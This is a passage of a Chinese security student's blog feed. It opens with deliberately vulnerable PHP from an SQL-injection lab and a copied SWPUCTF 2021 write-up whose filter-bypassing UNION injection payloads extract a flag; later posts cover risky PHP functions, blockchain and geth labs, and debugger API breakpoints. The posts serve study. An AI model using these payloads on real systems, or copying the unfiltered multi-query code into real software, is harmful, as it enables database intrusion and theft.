class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-comment">//logging the connection parameters to a file for analysis.</span><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;ID:&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br><span class="hljs-comment">// connectivity</span><br><span class="hljs-comment">//mysql connections for stacked query examples.</span><br><span class="hljs-variable">$con1</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$con1</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    @<span class="hljs-title function_ invoke__">mysqli_select_db</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$dbname</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> ( <span class="hljs-string">&quot;Unable to connect to the database: <span class="hljs-subst">$dbname</span>&quot;</span>);<br>&#125;<br><br><br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br>&#123;<br>    <br>    <br>    <span class="hljs-comment">/* store first result set */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_store_result</span>(<span class="hljs-variable">$con1</span>))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$result</span>))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Your Username is : %s&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Your Password is : %s&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>        &#125;<br><span class="hljs-comment">//            mysqli_free_result($result);</span><br>    &#125;<br>        <span class="hljs-comment">/* print divider */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_more_results</span>(<span class="hljs-variable">$con1</span>))<br>    &#123;<br>            <span class="hljs-comment">//printf(&quot;-----------------\n&quot;);</span><br>    &#125;<br>     <span class="hljs-comment">//while (mysqli_next_result($con1));</span><br>&#125;<br><span class="hljs-keyword">else</span> <br>    &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con1</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  <br>    &#125;<br><span class="hljs-comment">/* close connection */</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con1</span>);<br><br></code></pre></td></tr></table></figure><p>对输入的参数没有进行严格的过滤，攻击者构造恶意的攻击语句造成了SQL注入攻击，存在回显点，可以进行联合注入，并且如果出现错误，会输出报错信息，这里也可以使用显错注入。<br>还可以看到，这里的SQL语句查询使用的是mysqli_multi_query函数，mysqli_multi_query函数可以执行多条SQL语句。</p><p>别人得wp直接拿过来，下次给我启发<br>[SWPUCTF 2021 新生赛]sql</p><ol><li><p>测试</p><blockquote><p>?wllm&#x3D;1 – 正常<br>?wllm&#x3D;1’ – 报错<br>?wllm&#x3D;1’%23 –%23&gt;#– 正常<br>?wllm&#x3D;1’or 1&#x3D;1%23 – 发现有过滤  </p></blockquote></li><li><p>测试过滤</p><blockquote><p>空格，等号<br>空格&#x3D;&gt;&#x2F;xx&#x2F;<br>等号&#x3D;?like</p></blockquote></li><li><p>测试注入</p></li></ol><ul><li>测试长度  <blockquote><p>?wlmm&#x3D;1’order&#x2F;**&#x2F;by&#x2F;**&#x2F;3%23 – 正常<br>?wlmm&#x3D;1’order&#x2F;**&#x2F;by&#x2F;**&#x2F;4%23 – 错误<br>– 测试长度为3</p></blockquote></li><li>测试回显  <blockquote><p>?wlmm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3%23 # 2,3回显位置</p></blockquote></li><li>查库  <blockquote><p>?wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,database()%23 # test_db</p></blockquote></li><li>查表  <blockquote><p>wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;‘test_db’%23 – LTLT_flag,users</p></blockquote></li><li>查列  <blockquote><p>wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;‘test_db’%23<br>– id,flag,id,username</p></blockquote></li><li>查内容<blockquote><p>?wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(flag)&#x2F;**&#x2F;from&#x2F;**&#x2F;test_db.LTLT_<br>flag%23<br>– NSSCTF{e99758c1-d31b</p></blockquote></li><li>位数长度不足<br>使用截断函数进行绕过，substr，right，REVERSE 被过滤（测试出来的），只能用mid</li><li>mid截取，因为回显只能有20个，所以20，一组截取<blockquote><p>?wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,mid(group_concat(flag),20,20)&#x2F;**&#x2F;from&#x2F;**&#x2F;tes<br>t_db.LTLT_flag%23</p></blockquote></li><li>需要读三组<br>NSSCTF{e99758c1-d31b-4497-8d44-abfe84caa0ed}</li></ul><p>写一个可能有问题得点,-1为什么有显示，1没有显示<br>布尔逻辑：<br>在某些情况下，数据库会对输入进行布尔评估。比如，如果原始查询是：</p><blockquote><p>SELECT * FROM users WHERE active &#x3D; 1;  </p></blockquote><p>如果数据库中没有任何记录的 active 字段为 1，那么这个查询不会返回任何结果。但如果用 -1 替代，可能会导致返回符合条件的结果。<br>错误处理和信息泄露：</p><p>数据库在处理 1 和 -1 时的错误处理方式可能不同。例如，如果 1 导致一个错误或异常，而 -1 不会，这可能会导致不同的行为。在某些系统中，-1 可能被用作特定的标志，表示某种状态或条件。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php函数初识</title>
    <link href="/2024/09/30/php%E5%88%9D%E8%AF%86/"/>
    <url>/2024/09/30/php%E5%88%9D%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>本文讲对php的部分可能引起漏洞的部分函数进行讲解</p><span id="more"></span><h1 id="php函数初识"><a href="#php函数初识" class="headerlink" title="php函数初识"></a>php函数初识</h1><h2 id="1-phpinfo"><a href="#1-phpinfo" class="headerlink" title="1. phpinfo()"></a>1. phpinfo()</h2><p>phpinfo() 函数会显示 PHP 配置信息以及当前的 PHP 环境信息，包括服务器信息、操作系统信息、PHP 版本、已安装的扩展、环境变量等。这个函数通常用于调试和开发过程中查看 PHP 配置信息。</p><h2 id="2-eval"><a href="#2-eval" class="headerlink" title="2. eval()"></a>2. eval()</h2><p>eval() 函数会将传入的字符串作为 PHP 代码进行执行。如果传入的字符串包含恶意代码，eval() 函数将会执行这些恶意代码，从而可能导致代码注入漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt;x = <span class="hljs-number">7</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>( <span class="hljs-string">&#x27;3 * x&#x27;</span> )<br><span class="hljs-number">21</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;pow(2,2)&#x27;</span>)<br><span class="hljs-number">4</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;2 + 2&#x27;</span>)<br><span class="hljs-number">4</span><br>&gt;&gt;&gt; n=<span class="hljs-number">81</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;n + 4&quot;</span>)<br><span class="hljs-number">85</span><br></code></pre></td></tr></table></figure><h2 id="3-preg-replace"><a href="#3-preg-replace" class="headerlink" title="3. preg_replace()"></a>3. preg_replace()</h2><p>preg_replace() 函数用于执行正则表达式替换操作。如果正则表达式不正确或者传入的替换字符串包含恶意代码，preg_replace() 函数将会执行这些恶意代码，从而可能导致代码注入漏洞。</p><h2 id="4-include-和-require"><a href="#4-include-和-require" class="headerlink" title="4. include() 和 require()"></a>4. include() 和 require()</h2><ul><li>incluce 在用到时加载<br>include 的文件中出错了，主程序继续往下执行</li><li>require 在一开始就加载<br>require 的文件出错了，主程序也停了</li><li>_once 后缀表示已加载的不加载</li></ul><h2 id="5-file-get-contents"><a href="#5-file-get-contents" class="headerlink" title="5. file_get_contents()"></a>5. file_get_contents()</h2><p>file_get_contents() 函数用于读取文件内容。如果传入的文件路径包含恶意代码，file_get_contents() 函数将会执行这些恶意代码，从而可能导致代码注入漏洞。</p><h2 id="6-system"><a href="#6-system" class="headerlink" title="6. system()"></a>6. system()</h2><p>system() 函数用于执行系统命令。如果传入的命令包含恶意代码，system() 函数将会执行这些恶意代码，从而可能导致命令注入漏洞。</p><h2 id="7-exec"><a href="#7-exec" class="headerlink" title="7. exec()"></a>7. exec()</h2>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链</title>
    <link href="/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    <url>/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链实验1"><a href="#区块链实验1" class="headerlink" title="区块链实验1"></a>区块链实验1</h1><p>第一张题目<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200906200.png" srcset="/img/loading.gif" lazyload><br>区块链的操作引导<br>第一步查看引导<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200919655.png" srcset="/img/loading.gif" lazyload><br>第二步节点一<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200919341.png" srcset="/img/loading.gif" lazyload><br>第三步节点二<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200919780.png" srcset="/img/loading.gif" lazyload><br>第四步添加节点<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200920107.png" srcset="/img/loading.gif" lazyload><br>第五步，选中特定节点<br>第六步，选中状态标识<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200921564.png" srcset="/img/loading.gif" lazyload><br>第七步节点卡片信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200922747.png" srcset="/img/loading.gif" lazyload><br>第八步切换连接状态<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200922040.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200923900.png" srcset="/img/loading.gif" lazyload><br>第九步删除节点，操作期间删除被禁用<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200923166.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200923943.png" srcset="/img/loading.gif" lazyload><br>第十步通信按钮检查日志变化<br>第十一步通信日志展示节点间通信记录<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200924117.png" srcset="/img/loading.gif" lazyload><br>第十二步显示选中节点的区块链状态<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200925174.png" srcset="/img/loading.gif" lazyload><br>第十二步区块概要，点击可查看全部信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200926983.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200926289.png" srcset="/img/loading.gif" lazyload><br>第十四步，节点二挖矿按钮<br>第十五步提供打包交易和选择挖矿按钮<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200927617.png" srcset="/img/loading.gif" lazyload><br>第十六步挖矿两次，观察，数据链数据变化包括区块和高度<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200929661.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200929913.png" srcset="/img/loading.gif" lazyload><br>第十七步观察余额<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200931902.png" srcset="/img/loading.gif" lazyload><br>第十八步交易<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200931858.png" srcset="/img/loading.gif" lazyload><br>第十九夫输入交易内容手续费选择UXTO创建交易<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200933819.png" srcset="/img/loading.gif" lazyload><br>第二十步启动交易打包挖矿<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200933749.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200934133.png" srcset="/img/loading.gif" lazyload><br>第二十一步选择最后一个区块<br>第二十三步区块的详细信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200935271.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>web3</category>
      
    </categories>
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链2</title>
    <link href="/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE2/"/>
    <url>/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE2/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链技术实验2"><a href="#区块链技术实验2" class="headerlink" title="区块链技术实验2"></a>区块链技术实验2</h1><h2 id="安装以太坊"><a href="#安装以太坊" class="headerlink" title="安装以太坊"></a>安装以太坊</h2><p>sudo apt clear cache<br>sudo apt update<br>sudo apt-get install golang<br>sudo apt-get install make<br>sudo apt-get install git<br>sudo apt install build-essential<br>sudo apt-get install libltdl-dev<br>wget <a href="https://github.com/ethereum/go-ethereum/archive/refs/tags/v1.9.25.tar.gz">https://github.com/ethereum/go-ethereum/archive/refs/tags/v1.9.25.tar.gz</a><br>tar zxvf v1.9.25.tar.gz<br>获取压缩文件，并解压<br><img src="https://gitee.com/fogpost/photo/raw/master/202409250917601.png" srcset="/img/loading.gif" lazyload></p><h2 id="设置go代理"><a href="#设置go代理" class="headerlink" title="设置go代理"></a>设置go代理</h2><p>go env -w GO111MODULE&#x3D;on<br>go env -w GOPROXY&#x3D;<a href="https://mirrors.aliyun.com/goproxy/,direct">https://mirrors.aliyun.com/goproxy/,direct</a><br>cd go-ethereum-1.9.25<br>make geth<br>编译成功后添加path<br>nano .bashrc<br>#末尾添加<br>export PATH&#x3D;”$PATH:&#x2F;home&#x2F;kali&#x2F;go-ethereum-1.9.25&#x2F;build&#x2F;bin&#x2F;“<br>#ctrl+x 输入Y保存后执行<br>source .bashrc<br><img src="https://gitee.com/fogpost/photo/raw/master/202409250923077.png" srcset="/img/loading.gif" lazyload></p><h2 id="搭建私有链"><a href="#搭建私有链" class="headerlink" title="搭建私有链"></a>搭建私有链</h2><p>nano &#x2F;home&#x2F;kali&#x2F;genesis.json<br>#输入如下内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;chainId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">15665883188</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;homesteadBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip150Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip150Hash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip155Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip158Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;byzantiumBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constantinopleBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;petersburgBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;istanbulBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ethash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;nonce&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x5ddf8f3e&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;extraData&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;gasLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x47b760&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;difficulty&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x400&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mixHash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;coinbase&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;alloc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;gasUsed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;parentHash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/fogpost/photo/raw/master/202409250926397.png" srcset="/img/loading.gif" lazyload><br>相关说明<br>chainID:指定了独立的区块链网络 ID。网络 ID 在连接到其他节点的时候会用到，以太坊公网的网络 ID 是 1，为了不与公有链网络冲突，运行私有链节点的时候要指定自己的网络 ID。不同 ID 网络的节点无法相互连接。<br>alloc: 用来预置账号以及账号的以太币数量，因为私有链挖矿比较容易，所以我们不需要预置有币的账号，需要的时候自己创建即可以，默认为空即可。<br>coinbase: 矿工的账号，随便填即可。<br>difficulty: 设置当前区块的难度，如果难度过大，cpu挖矿就很难，这里设置较小难度。<br>extraData: 附加信息。这里要注意一下，新版本该值需要为16进制数据，以0x 开头。<br>gasLimit: 该值设置对GAS的消耗总量限制，用来限制区块能包含的交易信息总和，因为我们要做的是私有链，所以此处填最大。<br>nonce: nonce就是一个64位随机数(0x后一位为4个二进制位，故有16位），用于挖矿，注意他和mixhash的设置需要满足以太坊的Yellow paper, 4.3.4. Block Header Validity, (44)章节所描述的条件。<br>mixhash：与nonce配合用于挖矿，由上一个区块的一部分生成的hash。注意他和nonce的设置需要满足以太坊的Yellow paper, 4.3.4. Block Header Validity, (44)章节所描述的条件。<br>parentHash: 上一个区块的hash值，因为是创世块，所以这个值是0。<br>timestamp: 设置创世块的时间戳。  </p><h2 id="初始化创世区块"><a href="#初始化创世区块" class="headerlink" title="初始化创世区块"></a>初始化创世区块</h2><p>mkdir &#x2F;home&#x2F;kali&#x2F;privatechain<br>mv &#x2F;home&#x2F;kali&#x2F;genesis.json &#x2F;home&#x2F;kali&#x2F;privatechain<br>cd &#x2F;home&#x2F;kali&#x2F;privatechain<br>geth –datadir data0 init genesis.json<br>#返回successfully wrote genesis state 即成功<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270915848.png" srcset="/img/loading.gif" lazyload><br>成功生成创世区块<br>启动私有链<br>geth –identity “SCAU” –rpc –rpcport “8545” –datadir data0 –port “30303” –rpcapi “db,eth,net,web3” –allow-insecure-unlock –networkid 65534 –nodiscover console<br>‘’’<br>启动成功<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270917438.png" srcset="/img/loading.gif" lazyload><br>创建账户<br>personal.newAccount(“0000”)<br>personal.newAccount(“1234”)<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270921285.png" srcset="/img/loading.gif" lazyload><br>查看用户，我们创建了两个用户，并获取账号<br>personal.listAccounts<br>personal.listAccounts[0]<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270923613.png" srcset="/img/loading.gif" lazyload><br>查看账户余额，没有挖矿的情况下显示为0<br>eth.getBalance(personal.listAccounts[0])<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270923628.png" srcset="/img/loading.gif" lazyload><br>解锁我们的0号账户输入密码，就是我们创建账户时用的0000<br>personal.unlockAccount(personal.listAccounts[0]);<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270929356.png" srcset="/img/loading.gif" lazyload><br>然后我们开始挖矿<br>miner.start()一般用这个就行<br>注意这里开始挖矿后会提示Generating DAG in progress：生成DAG，它是用于以太坊工作量证明PoW算法的数据集，需要花一些时间去生成，是一个比较大的文件，每当生成30000块才会更新<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270930561.png" srcset="/img/loading.gif" lazyload><br>停止挖矿<br>miner.stop()<br>eth.accounts：枚举系统中的账户；<br>eth.getBalance()：查看账户余额，单位是 Wei（Wei 是以太坊中最小货币面额单位，类似比特币中的聪，1 ether &#x3D; 10^18 Wei）；<br>eth.blockNumber：列出区块总数；<br>eth.getTransaction()：获取交易；<br>eth.getBlock()：获取区块；<br>web3.fromWei()：Wei 换算成以太币；<br>web3.toWei()：以太币换算成 Wei；<br>txpool.status：交易池中的状态；<br>admin.addPeer()：连接到其他节点；<br>挖矿成功后可以查看账户余额<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270941668.png" srcset="/img/loading.gif" lazyload><br>打钱之前先解锁一下出钱的账户<br>personal.unlockAccount(personal.listAccounts[0]);<br>金额转换<br>amount &#x3D; web3.toWei(1,’ether’)<br>eth.sendTransaction({from:personal.listAccounts[0],to:personal.listAccounts[1],value:amount})<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270942094.png" srcset="/img/loading.gif" lazyload><br>交易没有发生，要在打包挖矿后才会发生<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270944030.png" srcset="/img/loading.gif" lazyload><br>开始挖矿，交易成功<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270948911.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>web3</category>
      
    </categories>
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见的API</title>
    <link href="/2024/09/27/%E5%B8%B8%E8%A7%81%E7%9A%84API/"/>
    <url>/2024/09/27/%E5%B8%B8%E8%A7%81%E7%9A%84API/</url>
    
    <content type="html"><![CDATA[<h3 id="常见的API接口查找方法"><a href="#常见的API接口查找方法" class="headerlink" title="常见的API接口查找方法"></a>常见的API接口查找方法</h3><p>写一些常见的API以后每次遇见我都会抄下来，写一下相关的解释和什么时候可以用到<br>我们要有一个想法，凡是这些api我们都知道这些都是系统所写好的东西，动态链接库给我们准备好的接口，就像c语言导入的头文件，但是很多强者也可能根本就不屑这些api自己实现，那么我们就完蛋了，但是也可以根据可能编写的代码，下断点，逆向本质就是由汇编看代码</p><h4 id="od快速查找"><a href="#od快速查找" class="headerlink" title="od快速查找"></a>od快速查找</h4><p>突然发现od早就有古人创建的api断电器了，可喜可贺可喜可贺<br><img src="https://gitee.com/fogpost/photo/raw/master/202409201016637.png" srcset="/img/loading.gif" lazyload></p><h4 id="od的命令行断点"><a href="#od的命令行断点" class="headerlink" title="od的命令行断点"></a>od的命令行断点</h4><p><img src="https://gitee.com/fogpost/photo/raw/master/202409201018652.png" srcset="/img/loading.gif" lazyload></p><h4 id="模块名称查找"><a href="#模块名称查找" class="headerlink" title="模块名称查找"></a>模块名称查找</h4><p><img src="https://gitee.com/fogpost/photo/raw/master/202409201018703.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409201019644.png" srcset="/img/loading.gif" lazyload></p><h3 id="常见的api"><a href="#常见的api" class="headerlink" title="常见的api"></a>常见的api</h3><h4 id="MessageBoxA"><a href="#MessageBoxA" class="headerlink" title="MessageBoxA"></a>MessageBoxA</h4><p>这个人尽皆知，在出现类似登录的窗口时当我们选择登录按键时便会发现，有弹窗便可以在此api下断点，到达判断位置</p><h4 id="GetwindowsTestA"><a href="#GetwindowsTestA" class="headerlink" title="GetwindowsTestA"></a>GetwindowsTestA</h4><p>这个的话是在登录窗口无明显回显时使用的方法可以获取我们的窗口输入文本</p><h4 